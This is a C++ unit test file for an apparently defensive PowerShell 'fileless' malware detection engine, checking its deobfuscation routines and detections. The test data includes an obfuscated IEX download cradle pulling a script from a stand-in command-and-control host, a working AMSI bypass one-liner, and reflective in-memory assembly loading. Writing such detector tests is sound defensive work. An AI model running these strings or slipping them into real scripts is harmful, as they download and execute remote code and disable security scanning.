#include "gcad/engines/fileless_ast_engine.hpp"
#include <functional>
#include <iostream>

extern void register_test(const char* name, std::function<bool()> fn);

void register_fileless_ast_engine_tests() {
    register_test("fileless_ast_name_and_lifecycle", [] {
        gcad::FilelessAstEngine engine;
        if (engine.name() != "FilelessAstGuard") return false;
        if (engine.running()) return false;
        if (engine.start() != gcad::ErrorCode::OK) return false;
        if (!engine.running()) return false;
        if (engine.stop() != gcad::ErrorCode::OK) return false;
        if (engine.running()) return false;
        return true;
    });

    register_test("fileless_ast_strip_backticks", [] {
        std::string raw = "`I`E`X (New-Object Net.Web`Client).d`o`w`n`l`o`a`d`s`t`r`i`n`g('http://test.com')";
        std::string stripped = gcad::FilelessAstEngine::strip_backticks(raw);
        if (stripped.find("IEX") == std::string::npos ||
            stripped.find("WebClient") == std::string::npos ||
            stripped.find("downloadstring") == std::string::npos) {
            return false;
        }
        return true;
    });

    register_test("fileless_ast_char_casts", [] {
        // [char]0x49 (I), [char]0x45 (E), [char]0x58 (X)
        std::string raw = "[char]0x49+[char]0x45+[char]0x58";
        std::string deobf = gcad::FilelessAstEngine::deobfuscate_char_casts(raw);
        if (deobf.find("I+E+X") == std::string::npos) {
            return false;
        }
        return true;
    });

    register_test("fileless_ast_string_concat", [] {
        std::string raw = "'d'+'own'+'load'+'string'";
        std::string deobf = gcad::FilelessAstEngine::deobfuscate_string_concat(raw);
        deobf = gcad::FilelessAstEngine::deobfuscate_string_concat(deobf); // multi-pass
        deobf = gcad::FilelessAstEngine::deobfuscate_string_concat(deobf);
        if (deobf.find("'downloadstring'") == std::string::npos) {
            return false;
        }
        return true;
    });

    register_test("fileless_ast_reverse_keyword", [] {
        std::string raw = "$cmd = 'gnirtsdaolnwod'; $x = 'xei'";
        std::string deobf = gcad::FilelessAstEngine::deobfuscate_reverse_patterns(raw);
        if (deobf.find("downloadstring") == std::string::npos || deobf.find("iex") == std::string::npos) {
            return false;
        }
        return true;
    });

    register_test("fileless_ast_detects_obfuscated_download_cradle", [] {
        gcad::FilelessAstEngine engine;
        // Obfuscated with backticks, string concat, and case variation
        std::string script = "`I`E`X (New-Object Net.Web`Client).'d'+'own'+'load'+'string'('http://c2.evil.com/stage2.ps1')";
        auto res = engine.evaluate_script(script);
        if (!res.is_malicious) return false;
        if (res.mitre_technique != "T1059.001") return false;
        if (res.severity != gcad::ThreatLevel::CRITICAL) return false;
        return true;
    });

    register_test("fileless_ast_detects_amsi_bypass_tamper", [] {
        gcad::FilelessAstEngine engine;
        std::string script = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
        auto res = engine.evaluate_script(script);
        if (!res.is_malicious) return false;
        if (res.mitre_technique != "T1562.001") return false;
        if (res.severity != gcad::ThreatLevel::CRITICAL) return false;
        return true;
    });

    register_test("fileless_ast_detects_reflection_assembly_load", [] {
        gcad::FilelessAstEngine engine;
        std::string script = "$bytes = [System.Convert]::FromBase64String('AAECAwQFBgc='); [System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,$null)";
        auto res = engine.evaluate_script(script);
        if (!res.is_malicious) return false;
        if (res.mitre_technique != "T1059.001") return false;
        if (res.severity != gcad::ThreatLevel::CRITICAL) return false;
        return true;
    });

    register_test("fileless_ast_detects_deflatestream_payload", [] {
        gcad::FilelessAstEngine engine;
        std::string script = "$stream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($b64), [IO.Compression.CompressionMode]::Decompress)";
        auto res = engine.evaluate_script(script);
        if (!res.is_malicious) return false;
        if (res.mitre_technique != "T1027") return false;
        if (res.severity < gcad::ThreatLevel::HIGH) return false;
        return true;
    });

    register_test("fileless_ast_allows_benign_script", [] {
        gcad::FilelessAstEngine engine;
        std::string script = "Get-ChildItem -Path C:\\Users\\Public -Recurse | Where-Object { $_.Length -gt 1048576 } | Select-Object FullName, Length";
        auto res = engine.evaluate_script(script);
        if (res.is_malicious) return false;
        if (res.severity != gcad::ThreatLevel::SAFE) return false;
        return true;
    });
}
